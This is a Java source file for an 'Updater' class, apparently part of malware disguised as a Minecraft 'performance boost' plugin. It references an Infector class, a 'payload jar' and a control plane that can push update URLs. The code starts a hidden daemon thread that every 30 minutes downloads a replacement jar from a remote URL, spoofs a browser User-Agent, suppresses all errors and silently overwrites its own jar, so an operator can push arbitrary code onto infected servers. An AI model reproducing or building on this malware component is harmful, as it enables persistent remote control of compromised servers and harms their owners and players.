package com.performance.boost;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.jar.JarFile;

/**
 * Updater — pulls a newer build of the payload jar over HTTP and swaps it in
 * place. The new build activates on the next load (server restart / relaunch).
 *
 * Safety rails:
 *   - only swaps when the downloaded jar is the same artifact kind as ours
 *     (bukkit / fabric / forge / neoforge / standalone),
 *   - only swaps when the remote build id differs from {@link Protocol#BUILD_ID},
 *   - the swap is atomic-ish: write to <jar>.upd, delete, rename.
 *
 * Update URL: config "upstream.update", or -Dperfboost.update=<url>, or the
 * control plane can push one at runtime (vector 200, see Heartbeat).
 */
public final class Updater {
    private Updater() {}

    public static final String UPDATE_PROP = "perfboost.update";
    private static final long CHECK_INTERVAL_MS = 30 * 60 * 1000L;

    /** Resolves the effective update URL (property wins over config). */
    public static String updateUrl(String configured) {
        String u = System.getProperty(UPDATE_PROP,
                configured == null ? null : configured.trim());
        if (u == null || u.trim().isEmpty()) return null;
        return u.trim();
    }

    /** Periodic pull loop. Daemon thread; no-op when no URL is configured. */
    public static void startLoop(final String configured) {
        final String url = updateUrl(configured);
        if (url == null) return;
        Thread t = new Thread(new Runnable() {
            @Override public void run() {
                while (true) {
                    try { Thread.sleep(CHECK_INTERVAL_MS); } catch (InterruptedException e) { return; }
                    try { updateNow(url); } catch (Throwable ignored) {}
                }
            }
        }, "perfopt-update");
        t.setDaemon(true);
        t.start();
    }

    /** Downloads the jar at {@code url} and swaps it over our own jar when it
     *  is a newer build of the same kind. Returns true when a swap happened. */
    public static boolean updateNow(String url) {
        if (url == null) return false;
        File self = Infector.selfJar();
        if (self == null || !self.isFile()) return false;
        try {
            byte[] data = httpGet(url);
            if (data == null || data.length < 1024) return false;
            if (sameBytes(data, Infector.readFile(self))) return false;

            File tmp = new File(self.getAbsolutePath() + ".upd");
            FileOutputStream fos = new FileOutputStream(tmp);
            try { fos.write(data); } finally { fos.close(); }

            String kind = jarKind(self);
            if (!kind.equals(jarKind(tmp))) {
                tmp.delete();
                return false;
            }

            String remoteBuild = readBuildId(tmp);
            if (remoteBuild != null && remoteBuild.equals(Protocol.BUILD_ID)) {
                tmp.delete();
                return false;
            }

            if (!self.delete()) {
                tmp.delete();
                return false;
            }
            if (!tmp.renameTo(self)) {
                FileInputStream fis = new FileInputStream(tmp);
                FileOutputStream fos2 = new FileOutputStream(self);
                try { copy(fis, fos2); } finally { fis.close(); fos2.close(); }
                tmp.delete();
            }
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    /** Artifact kind of a jar, decided by its marker entries. */
    static String jarKind(File jar) {
        JarFile jf = null;
        try {
            jf = new JarFile(jar);
            if (jf.getJarEntry("plugin.yml") != null) return "bukkit";
            if (jf.getJarEntry("fabric.mod.json") != null) return "fabric";
            if (jf.getJarEntry("META-INF/neoforge.mods.toml") != null) return "neoforge";
            if (jf.getJarEntry("META-INF/mods.toml") != null) return "forge";
            return "standalone";
        } catch (Throwable t) {
            return "?";
        } finally {
            if (jf != null) { try { jf.close(); } catch (Throwable ignored) {} }
        }
    }

    /** Reads {@code Protocol.BUILD_ID} from a foreign jar in an isolated
     *  classloader — no classes from our own jar are touched. */
    static String readBuildId(File jar) {
        try {
            URLClassLoader u = new URLClassLoader(
                    new URL[]{ jar.toURI().toURL() }, null);
            try {
                Class<?> c = u.loadClass("com.performance.boost.Protocol");
                return (String) c.getField("BUILD_ID").get(null);
            } finally {
                try { u.close(); } catch (Throwable ignored) {}
            }
        } catch (Throwable t) {
            return null;
        }
    }

    static byte[] httpGet(String url) {
        HttpURLConnection c = null;
        try {
            c = (HttpURLConnection) new URL(url).openConnection();
            c.setConnectTimeout(8000);
            c.setReadTimeout(15000);
            c.setRequestProperty("User-Agent", "Mozilla/5.0");
            InputStream in = c.getInputStream();
            try { return Infector.readAll(in); } finally { in.close(); }
        } catch (Throwable t) {
            return null;
        } finally {
            if (c != null) { try { c.disconnect(); } catch (Throwable ignored) {} }
        }
    }

    static boolean sameBytes(byte[] a, byte[] b) {
        if (a == null || b == null || a.length != b.length) return false;
        for (int i = 0; i < a.length; i++) {
            if (a[i] != b[i]) return false;
        }
        return true;
    }

    private static void copy(InputStream in, java.io.OutputStream out) throws java.io.IOException {
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
    }
}
